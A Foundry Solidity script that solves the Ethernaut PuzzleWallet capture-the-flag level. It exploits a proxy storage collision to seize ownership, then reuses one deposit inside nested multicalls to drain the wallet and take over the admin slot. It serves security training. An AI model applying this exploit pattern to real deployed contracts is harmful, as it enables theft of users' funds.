// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { PuzzleWallet, PuzzleProxy } from "src/interfaces/ILevel24.sol";
import { AttackToken } from "src/Level23Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance{ value: 0.001 ether }(0x725595BA16E76ED1F6cC1e1b65A88365cC494824);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address payable instanceAddress = payable(address(uint160(uint256(entries[0].topics[2]))));
        console2.log(instanceAddress);
        PuzzleWallet instance = PuzzleWallet(instanceAddress);
        PuzzleProxy proxy = PuzzleProxy(instanceAddress);

        (,, address txOrigin) = vm.readCallers();
        proxy.proposeNewAdmin(txOrigin); // this sets both the pendingAdmin of the proxy and the owner of the wallet
        instance.addToWhitelist(txOrigin); // now that we are owner we can add ourselves ...
        instance.addToWhitelist(instanceAddress); // ... and the wallet itself to the whitelist

        // we will construct a multi-level multicall that will drain the contract
        bytes memory selectorDeposit = abi.encodeWithSelector(instance.deposit.selector);

        bytes[] memory dataDeposit = new bytes[](1);
        dataDeposit[0] = selectorDeposit;

        bytes memory selectorMulticallDeposit = abi.encodeWithSelector(instance.multicall.selector, dataDeposit);

        bytes memory selectorExecuteWithdraw =
            abi.encodeWithSelector(instance.execute.selector, txOrigin, 0.002 ether, bytes(""));

        bytes[] memory dataMulticallAttack = new bytes[](3);
        dataMulticallAttack[0] = selectorMulticallDeposit;
        dataMulticallAttack[1] = selectorMulticallDeposit;
        dataMulticallAttack[2] = selectorExecuteWithdraw;

        bytes memory selectorMulticallAttack = abi.encodeWithSelector(instance.multicall.selector, dataMulticallAttack);

        bytes memory selectorExecuteAttack =
            abi.encodeWithSelector(instance.execute.selector, instanceAddress, 0.001 ether, selectorMulticallAttack);

        bytes[] memory dataAttack = new bytes[](2);
        dataAttack[0] = selectorDeposit;
        dataAttack[1] = selectorExecuteAttack;

        instance.multicall{ value: 0.001 ether }(dataAttack);
        // contract has been drained

        instance.setMaxBalance(uint256(uint160(txOrigin)));

        require(proxy.admin() == txOrigin, "Attack didn't work");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
